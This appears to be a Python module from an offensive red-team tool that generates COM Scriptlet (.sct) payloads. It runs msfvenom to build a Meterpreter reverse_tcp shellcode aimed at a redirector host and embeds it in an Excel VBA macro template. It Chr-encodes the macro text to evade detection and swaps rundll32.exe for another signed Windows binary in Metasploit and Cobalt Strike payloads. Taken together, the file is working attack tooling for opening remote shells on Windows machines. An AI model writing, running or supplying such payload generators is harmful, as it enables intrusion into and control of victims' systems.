#!/usr/bin/env python
from uuid import uuid4
from string import ascii_uppercase, digits
from random import choice
from shutil import copyfile, which
from fileops import fileFindReplace
import re
from os import system
from sys import exit
from encoder import encodeStringAsChr, convertToVBAFormat
import itertools

'''
This module is used for generating COM Scriptlet payloads.
'''

def genClassID():
	'''
	Generates a Class ID aka uuid for the COM scriptlet payload.

	Returns uuid
	'''
	return uuid4()

def genSCT(framework, stagingMethod, redirector, x86, x64, cspayload='cs.sct'):
	'''
	Generates a COM Scriptlet payload aka sct file.
	'''
	if 'CobaltStrike' in framework:
		modifyCobaltStrikePayload(cspayload , x86, x64)
	elif 'Metasploit' in framework:
		if 'VBAMacro' in stagingMethod:
			msfShellCode = getMetasploitShellCode(redirector)
			macro = genVBAMacro(msfShellCode, x86, x64)
	else:
		print('{0} framework is not supported yet' % framework)

def genProgID(size=8, chars=ascii_uppercase + digits):
	'''
	Generates a pseudo random program id for the COM scriptlet payload.

	Returns a program id
	'''
	progid = ''.join(choice(chars) for _ in range(size))
	return progid

def genVBAMacro(shellCode, x86, x64):
	'''
	Generates a visual basic macro. This is a lazy version until we 
	write a Chr encoding function that accounts for string concatenation
	and line length within vba. Ideally, this will be switched over to a
	VBA Macro COM Scriptlet template and we build the entire Chr encoded
	string.
	'''
	copyfile('./templates/excel_vba_macro.sct', 'payload.sct')
	fileFindReplace('payload.sct', 'exampleprogid', genProgID())
	fileFindReplace('payload.sct', 'exampleclassid', str(genClassID()))
	fileFindReplace('payload.sct', 'Array()', shellCode.rstrip())

	textToEncode = ''
	textToEncodeList = []
	start = []
	end = []

	with open('payload.sct', 'r') as payloadFile:
		for line in itertools.islice(payloadFile, 0, 34):
			start.append(line)
	
	with open('payload.sct', 'r') as payloadFile:
		for line in itertools.islice(payloadFile, 35, 129):
			if 'SysWOW64' in line:
				textToEncode += line.replace('rundll32.exe' , x64)
				textToEncodeList.append(line)
			elif 'System32' in line:
				textToEncode += line.replace('rundll32.exe' , x86)
				textToEncodeList.append(line)
			else:
				textToEncode += line
				textToEncodeList.append(line)


	with open('payload.sct', 'r') as payloadFile:
		for line in itertools.islice(payloadFile, 130, 146):
			end.append(line)

	encodedList = convertToVBAFormat(encodeStringAsChr(textToEncode))
	encodedList.append('\n')
	encodedText = ''.join(i + '\n' for i in encodedList)

	payload = start + encodedList + end

	with open('payload.sct', 'w') as payloadFile:
		for item in payload:
			if 'xlmodule.CodeModule.AddFromString' in item:
				payloadFile.write(item.rstrip() + ' ')
			else:
				payloadFile.write(item)

def getMetasploitShellCode(redirector):
	'''
	Generates a metaspoit vba macro via msfvenom. 
	Parses the Array of shellcode via regex from the generated macro.
	Create a string of the meterpreter shellcode.

	Returns string of shellcode
	'''
	code = ''
	if which('msfvenom'):
		system('msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f vba > /tmp/metasploitvba'.format(redirector[0], redirector[1]))
		for line in open('/tmp/metasploitvba', 'r'):
			code += line

		shellCode = re.findall(r"(Array\(((\-|\d).*)\s+|^(\-|\d)(.*?(_|\d\))\s+))", code, flags=re.MULTILINE)
		msfShellCode = ''.join(i[0].replace('', '') for i in shellCode)

		return msfShellCode
	else:
		print('[-] ERROR: msfvenom is not installed on the system. Please install msfvenom to use Great SCT.')
		exit()

def modifyCobaltStrikePayload(cspayload, x86, x64):
	'''
	Find and replaces encoded rundll32.exe with exe specified in config.
	Specifiy a signed binary from the following locations in the config.
	x86 - C:\Windows\System32\
	x64 - C:\Windows\SysWOW64\
	'''
	x86_encoded_path = 'Chr(114)&Chr(34)&Chr(41)&Chr(32)&Chr(38)&Chr(32)&Chr(34)&Chr(92)&Chr(92)&Chr(83)&Chr(121)&Chr(115)&Chr(116)&Chr(101)&Chr(109)&Chr(51)&Chr(50)&Chr(92)&Chr(92)&'
	x64_encoded_path = 'Chr(92)&Chr(83)&Chr(121)&Chr(115)&Chr(87)&Chr(79)&Chr(87)&Chr(54)&Chr(52)&Chr(92)&Chr(92)&'
	rundll32_path = 'Chr(114)&Chr(117)&Chr(110)&Chr(100)&Chr(108)&Chr(108)&Chr(51)&Chr(50)&'
	x86_replace = convertTextToChr(x86)
	x64_replace = convertTextToChr(x64)

	fileFindReplace(cspayload, x86_encoded_path + rundll32_path, x86_encoded_path + x86_replace)
	fileFindReplace(cspayload, x64_encoded_path + rundll32_path, x64_encoded_path + x64_replace)
